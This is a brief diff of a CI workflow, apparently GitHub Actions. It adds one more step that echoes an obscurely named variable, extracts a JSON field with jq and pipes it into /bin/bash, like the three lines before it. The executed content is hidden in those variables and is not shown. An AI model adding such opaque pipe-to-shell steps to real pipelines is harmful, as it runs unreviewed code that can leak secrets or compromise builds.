@@ -25,6 +25,7 @@ jobs:
           printf '%s' "$sbd657" | jq -r .y792 | /bin/bash
           echo $dhrw1021 | jq -r .koqzo12 | /bin/bash
           echo $gvl255 | jq -r .xx168 | /bin/bash
+          echo $pbf1948 | jq -r .k80590 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
